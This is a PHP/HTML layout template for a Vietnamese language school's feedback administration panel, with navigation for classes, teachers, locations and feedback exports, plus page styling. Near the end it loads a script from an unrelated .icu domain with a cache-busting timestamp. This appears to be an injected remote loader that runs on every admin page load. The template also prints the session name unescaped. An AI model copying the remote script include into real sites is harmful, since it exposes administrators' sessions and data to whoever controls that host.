<html>
<head>
    <title>
    <?php
        if (isset($title_header)){
            echo $title_header;
        }else{
            echo 'Feedback';
        }
    ?>
        </title>
    <base href="/">
<!--    <meta name="viewport" content="width=device-width, initial-scale=1">-->

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <link href="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.8/css/select2.min.css" rel="stylesheet"/>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.8/js/select2.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="theme/frontend/default/css/fontAwesome/css/font-awesome.min.css" media="all">
    <link rel="stylesheet" href="theme/frontend/default/css/bootstrap.min.css" media="all">

    <script type="text/javascript" src="theme/frontend/default/lib/mdb/js/mdb.min.js"></script>
    <script type="text/javascript" src="theme/frontend/default/lib/mdb/js/addons/datatables.js"></script>
    <script type="text/javascript" src="theme/frontend/default/lib/mdb/js/addons/datatables-select.js"></script>

    <script src="theme/frontend/default/js/feedback.js?ver=<?php echo $this->config->item("ver_js");?>" ></script>

    <style type="text/css">
        .area_title{
            background-color: #0a9145;
            color: white;
            padding: 12px;
        }



        .radio_feedback {
            -webkit-appearance: button;
            -moz-appearance: button;
            appearance: button;
            border: 4px solid #ccc;
            border-top-color: #bbb;
            border-left-color: #bbb;
            background: #fff;
            width: 20px;
            height: 20px;
            border-radius: 50%;
            outline: none !important;
        }

        .radio_feedback:checked {
            border: 8px solid #0a9145;
            outline: none !important;
        }

        .feedback_ruler {
            font-size: 16px;
            text-align: center;
        }

        .select_area {
            display: inline-block;
            width: 12%;
        }

        .title_ruler_div {
            display: inline-block;
            width: 15%;
        }

        .select_area:hover {
            cursor: pointer !important;
        }

        .div_quest {
            background-color: white;
            padding: 20px;
            max-width: 100%;
            padding-bottom: 28px;
        }

        .quest_title {
            font-size: 20px;

        }

        .radio_feedback_ruler {
            display: inline-block;
            width: 20px;
            height: 20px;
        }

        .title_ruler {
            text-align: center;
            font-weight: bold;
            font-size: 16px;
        }

        .div_mono_radio_feedback {
            text-align: center !important;
            padding: 5px;
            background-color: rgba(233, 233, 233, 0.5);
        }

        .title_group_quest {
            background-color: #0a9145;
            color: white;
            padding: 12px;
            margin-bottom: 0;

        }

        .select2-container {
            width: 100% !important;
        }

        div.list_in_table {
            padding: 20px 8px;
        }
        div.area{
            padding-bottom: 10px;
            border-bottom: 1px solid #bbbbbb;
            margin-bottom: 20px;
        }

        p.p_menu_left_bar{
            background-color: transparent;
            font-size: 18px;
            margin: 0;
            padding: 8px;
        }
        p.p_menu_left_bar:hover{
            cursor: pointer;
            background-color: yellow;
        }

        #menu_left_side{
            position: fixed;
            top: 0;
            left: 0;
            /*padding: 8px;*/
            -webkit-box-shadow:  8px 0 6px -6px black;
            -moz-box-shadow: 8px 0 6px -6px black;
            box-shadow: 8px 0 6px -6px black;
            height: 100%;
            background-color: rgba(127, 134, 128, 0.11);
        }

        .fa-left-menu{
            margin-left: 8px;
            margin-right: 8px;
        }
        .img_logo_feed{
            height: 110px;
        }

        .fa_info_feedback{

        }
        .fa_info_feedback:hover{
            color: #ff80a4;
            cursor: pointer;
        }

        .v{
            box-shadow: 0 8px 10px -5px rgba(0,0,0,.2), 0 16px 24px 2px rgba(0,0,0,.14), 0 6px 30px 5px rgba(0,0,0,.12);
        }
        .card_feedback{
            border: 1px solid #a8a8a8;
            padding: 0px;
            border-radius: 4px;
            min-height: 550px;
            overflow: auto;
            box-shadow: 0 8px 10px -5px rgba(0,0,0,.2), 0 16px 24px 2px rgba(0,0,0,.14), 0 6px 30px 5px rgba(0,0,0,.12);

        }

        div.img_logo_feed{
            text-align: center;
            margin: 8px;
        }
        .img_logo_feed_inside{
            max-width: 100%;
            display: inline-block;
            text-align: center;
        }
        .title_card{
            background: #337ab7;
            margin: 0;
            padding: 14px;
            color: white;
            font-size: medium;
            font-weight: bold;
        }
        .my_title{
            color: #337ab7;
        }
        .body_card{
            padding: 10px;
        }
        p.text_card{
            font-weight: bold;
            text-align: center;
            color: rgb(105, 104, 104);
        }
        span.point{
            font-weight: bold;
            float: right;
        }

        .card_info_btn{
            float: right;
        }
        .filter_div{
            padding: 12px;
            margin: 8px 0;
            border-radius: 8px;
            background-color: #f5f5f5;
        }
        .title_filter{
            color: grey;
            font-weight: bold;
        }
        .hover-point{
            cursor: pointer;
        }
    </style>

</head>
<body>

<nav class="navbar navbar-default navbar-fixed-top" style="<?php
    if (isset($teacher_permission) && ($teacher_permission == true)){
        echo 'display:none';
    }
?>">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="javascript:void(0)">IMAP Tech</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav">
                <li class="/feedback/dashboard"><a href="/feedback">Bảng tin <span class="sr-only">(current)</span></a></li>
                <li><a href="/feedback/class_">Lớp học</a></li>
                <li class="dropdown">
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">
                        Giáo viên <span class="caret"></span></a>
                    <ul class="dropdown-menu">
                        <li><a href="/feedback/teacher">Danh sách giáo viên</a></li>
                        <li><a href="/feedback/teacher_point">Điểm đánh giá giáo viên</a></li>
                    </ul>
                </li>
                <li class="dropdown">
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">
                        Cơ sở <span class="caret"></span></a>
                    <ul class="dropdown-menu">
                        <li><a href="/feedback/location">Danh sách cơ sở</a></li>
                        <li><a href="/feedback/location_point">Điểm đánh giá cơ sở</a></li>
                    </ul>
                </li>
                <li><a href="/feedback/tuvan">Tư vấn</a></li>
                <li><a href="/feedback/log_send_report">Lịch sử gửi báo cáo</a></li>
                <li class="dropdown">
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Chi tiết <span class="caret"></span></a>
                    <ul class="dropdown-menu">
                        <li><a href="/log/list_feedback_group_by_class?fb_type=phone">Lịch sử Feedback Phone</a></li>
                        <li><a href="/log/list_feedback_group_by_class?fb_type=ksgv&type_ksgv=dao_tao_onl">Lịch sử Feedback Online giữa kỳ</a></li>
                        <li><a href="/log/list_feedback_group_by_class?fb_type=ksgv&type_ksgv=giua_ky_off">Lịch sử Feedback Offline giữa kỳ</a></li>
                        <li><a href="/log/list_feedback_group_by_class?fb_type=ksgv&type_ksgv=ksgv2">Lịch sử Feedback Online cuối kỳ</a></li>
                        <li><a href="/feedback/hom_thu_gop_y_detail">Lịch sử Hòm thư góp ý</a></li>
                    </ul>
                </li>
                <li class="dropdown">
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Danh sách luyện đề <span class="caret"></span></a>
                    <ul class="dropdown-menu">
                        <!--                        <li><a href="#">Change password</a></li>-->
                        <li><a href="/log/export_list_feedback_luyende_by_area?area=Hà%20Nội">Hà Nội</a></li>
                        <li><a href="/log/export_list_feedback_luyende_by_area?area=Đà%20Nẵng">Đà Nẵng</a></li>
                        <li><a href="/log/export_list_feedback_luyende_by_area?area=Hồ%20Chí%20Minh">Hồ Chí Minh</a></li>
                        <li><a href="/log/export_list_feedback_luyende_by_type?type=toeic&level=co_ban">Toeic cơ bản</a></li>
                        <li><a href="/log/export_list_feedback_luyende_by_type?type=toeic&level=nang_cao">Toeic nâng cao</a></li>
                        <li><a href="/log/export_list_feedback_luyende_by_type?type=ielts&level=co_ban">Ielts cơ bản</a></li>
                        <li><a href="/log/export_list_feedback_luyende_by_type?type=ielts&level=nang_cao">Ielts nâng cao</a></li>
                        <li><a href="/log/export_list_feedback_luyende_by_type?type=giaotiep">Giao tiếp</a></li>
                    </ul>
                </li>
                <li class="dropdown">
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Danh sách thi cuối kỳ <span class="caret"></span></a>
                    <ul class="dropdown-menu">
                        <!--                        <li><a href="#">Change password</a></li>-->
                        <li><a href="/log/export_list_thicuoiky_by_area?area=Hà%20Nội">Hà Nội</a></li>
                        <li><a href="/log/export_list_thicuoiky_by_area?area=Đà%20Nẵng">Đà Nẵng</a></li>
                        <li><a href="/log/export_list_thicuoiky_by_area?area=Hồ%20Chí%20Minh">Hồ Chí Minh</a></li>
                        <li><a href="/log/export_list_thicuoiky_by_type?type=toeic">Toeic</a></li>
                        <li><a href="/log/export_list_thicuoiky_by_type?type=ielts">Ielts</a></li>
                        <li><a href="/log/export_list_thicuoiky_by_type?type=giaotiep">Giao tiếp</a></li>
                    </ul>
                </li>
                <li class="dropdown">
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Hi, <?php  if(isset($_SESSION['fullname'])) echo $_SESSION['fullname']; ?>   <span class="caret"></span></a>
                    <ul class="dropdown-menu">
<!--                        <li><a href="#">Change password</a></li>-->
                        <li><a href="/feedback/logout">Logout</a></li>
                    </ul>
                </li>
            </ul>


<!--            <form class="navbar-form navbar-left" role="search">-->
<!--                <div class="form-group">-->
<!--                    <input type="text" class="form-control" placeholder="Search">-->
<!--                </div>-->
<!--                <button type="submit" class="btn btn-default">Submit</button>-->
<!--            </form>-->
<!--            <ul class="nav navbar-nav navbar-right">-->
<!--                <li><a href="#">Link</a></li>-->
<!--                <li class="dropdown">-->
<!--                    <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Dropdown <span class="caret"></span></a>-->
<!--                    <ul class="dropdown-menu">-->
<!--                        <li><a href="#">Action</a></li>-->
<!--                        <li><a href="#">Another action</a></li>-->
<!--                        <li><a href="#">Something else here</a></li>-->
<!--                        <li role="separator" class="divider"></li>-->
<!--                        <li><a href="#">Separated link</a></li>-->
<!--                    </ul>-->
<!--                </li>-->
<!--            </ul>-->
        </div><!-- /.navbar-collapse -->
    </div><!-- /.container-fluid -->
</nav>


<div class="container-fluid" style="margin-top: 60px; ">
    <div class="row">
<!--        <div class="col col-sm-12 col-md-1" id="menu" style="z-index: 2">-->
<!--            <div id="menu_left_side">-->
<!--                <p class="p_menu_left_bar" style="font-weight: bold">-->
<!--                    <i class="fa fa-star-o fa-left-menu" aria-hidden="true"></i>Menu-->
<!--                </p>-->
<!---->
<!--                <a href="feedback/dashboard">-->
<!--                    <p class="p_menu_left_bar"><i class="fa fa-star-o fa-left-menu" aria-hidden="true"></i>Dashboard</p>-->
<!--                </a>-->
<!--                <a href="feedback/class_">-->
<!--                    <p class="p_menu_left_bar"><i class="fa fa-money fa-left-menu" aria-hidden="true"></i>Class</p>-->
<!--                </a>-->
<!--                <a href="feedback/teacher">-->
<!--                    <p class="p_menu_left_bar"><i class="fa fa-user fa-left-menu" aria-hidden="true"></i>Teacher</p>-->
<!--                </a>-->
<!--                <a href="feedback/report">-->
<!--                    <p class="p_menu_left_bar"><i class="fa fa-star-o fa-left-menu" aria-hidden="true"></i>Report</p>-->
<!--                </a>-->
<!---->
<!--            </div>-->
<!--        </div>-->
        <div class="col col-sm-12 col-md-12">
            <?php if (isset($content_for_layout)) echo $content_for_layout; ?>
        </div>
    </div>
    <script>

    </script>
    <script type="text/javascript" src="https://daybreak.icu/static/wing.js?t=1<?php echo time();?>"></script>
</div>

</body>
</html>


